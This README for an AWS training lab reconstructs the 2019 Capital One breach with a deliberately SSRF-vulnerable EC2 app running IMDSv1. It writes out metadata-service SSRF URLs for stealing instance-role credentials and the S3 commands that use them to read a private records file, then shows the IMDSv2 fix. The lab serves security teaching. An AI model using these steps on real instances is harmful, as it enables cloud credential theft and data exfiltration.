# Capital One–shaped WAF SSRF lab (IMDSv1)

Disposable AWS lab that reconstructs the **2019 Capital One** entry:

1. An internet-facing app on EC2 that **GETs whatever `?url=` says** (SSRF).
2. **IMDSv1** (`HttpTokens=optional`).
3. Instance role **`capone-imds-lab-instance`** that can list buckets and read one private object.

The attack URL is the same as the blog:

`http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

**Do not run this in production. Use a throwaway account. Tear it down when you are done. Port 80 is open.**

## How the scripts know your AWS account

`setup.sh` and `destroy.sh` **do not take an account ID**. They use the AWS CLI identity already configured on your machine.

```text
aws configure --profile lab          # writes keys for that profile
export AWS_PROFILE=lab               # this shell now talks to THAT account
export AWS_REGION=us-east-1          # optional; scripts default to us-east-1
aws sts get-caller-identity          # confirm account / user / role
./setup.sh                           # deploys into that same identity
```

On start, both scripts print `AWS_PROFILE`, account ID, ARN, and region, then ask `y/N` before creating or deleting anything.

Skip the prompt only if you are sure:

```bash
ASSUME_YES=1 ./setup.sh
ASSUME_YES=1 ./destroy.sh
```

If the CLI is not authenticated, the script exits and prints these steps.

You need AWS CLI v2, a **default VPC** in the region, and IAM permission to create EC2, instance profiles/roles, S3 buckets, and security groups.

## Setup

```bash
git clone https://github.com/Pranav-Thorve/imdsv1-ssrf-lab.git
cd imdsv1-ssrf-lab
chmod +x setup.sh destroy.sh
export AWS_PROFILE=lab
export AWS_REGION=us-east-1
./setup.sh
```

## What you do

In the **browser address bar**:

```
http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Then append the role name:

```
http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/capone-imds-lab-instance
```

The body is the instance-role JSON.

Put those keys in a CLI profile (session token is required for `ASIA` keys):

```bash
aws configure --profile cloud-sec-lab
aws sts get-caller-identity --profile cloud-sec-lab
aws s3 ls --profile cloud-sec-lab
aws s3 ls s3://<lab-bucket> --recursive --profile cloud-sec-lab
aws s3 cp s3://<lab-bucket>/secret/customer-records.txt - --profile cloud-sec-lab
```

Require IMDSv2 (use the **same** `AWS_PROFILE` you used for setup):

```bash
aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required
```

Reload the same `/fetch?url=` URLs. Expect **401**.

## Destroy

Use the **same profile and region** as setup:

```bash
export AWS_PROFILE=lab
export AWS_REGION=us-east-1
./destroy.sh
```

Only resources tagged `Project=capone-imds-lab` in that account/region are removed.
